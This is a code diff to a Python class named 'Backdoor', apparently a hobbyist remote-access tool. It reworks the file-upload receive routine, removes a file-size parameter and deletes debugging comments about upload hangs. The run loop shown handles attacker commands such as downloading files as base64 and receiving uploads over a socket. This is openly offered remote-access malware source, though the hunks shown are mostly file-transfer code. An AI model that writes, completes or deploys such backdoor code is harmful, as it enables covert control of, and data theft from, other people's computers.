@@ -27,30 +27,21 @@ class Backdoor:
 		decoded_json = json_data.decode() #wrap data in json format
 		return json.loads(decoded_json)
 
-	def dodgy_fragmented_receive(self, filename, filesize):
-
+	def fragmented_receive(self, filename):
 		base_filename = os.path.basename(filename)
 		print("Base filename: " + base_filename)
 		print("Filename: " + filename)
-		filesize = int(filesize)
 
-		#progress_bar = tqdm.tqdm(range(filesize), "Receiving {filename}", unit="B", unit_scale=True, unit_divisor=1024)
 		byte_read_count = 0
 		with open(base_filename, "wb") as file:
 			while True:
-			#while byte_read_count <= filesize:
-				print("Received " + str(byte_read_count) + "/" + str(filesize) + " bytes")
 				bytes_read = self.connection.recv(self._buffer_size)
 				if bytes_read == "TRANS_COM":
 					print("Transmission complete")
 					break
-				byte_read_count += 1024
 				file.write(bytes_read)
 			print("outside the loop")
-			return "[+] {filename} uploaded successfully"
-
-			
-				
+			return "[+] {filename} uploaded successfully"	
 
 
 	def reliable_send(self, data):
@@ -88,19 +79,7 @@ class Backdoor:
 		with open(path, "rb") as file:
 			return base64.b64encode(file.read())
 
-	#sometimes seems like I can only issue upload commands after uploading an image
-	# this time it worked but when trying to upload wall2.jpg, it did not even send
-	# path to getting stuck: wall.jpg, ps, op, be, meme, test.txt, ps, cd, wall.jpg, ps, cd, wall2.jpg -> hang
-
-	# seems uploading wall2.jpg on its own causes the hang too
-	# seems like wall2.jpg is corrupt? strange as it was working
-	# maybe a read operation was interrupted or something weird happened
-
-	# hang: text.txt, wall4.jpg (error not found), upload wall3.jpg, ps -> hang
-	# issue happens trying to issue commands after upload wall4.png
-
-	# when command hangs, reliable_recieve() seems to be appending the command to the end of a chunk of ascii bytes. Something is going wrong with the transmission which is resulting in incomplete transmisson of file data
-		# problem is caused because reliable_receive() is not supposed to receive file data
+	
 	def run(self):
 		#self.connection.send("\n[+] Welcome to hell\n")
 		while True:
@@ -115,8 +94,7 @@ class Backdoor:
 					command_result = self.read_file(command[1])
 				elif command[0] == "upload":
 					filename = command[1]
-					filesize = command[2]
-					command_result = self.dodgy_fragmented_receive(filename, filesize)
+					command_result = self.fragmented_receive(filename)
 					#command_result = "[+] Upload successful"
 					#command_result = self.write_file(command[1], command[2]) #name, content
 				else:
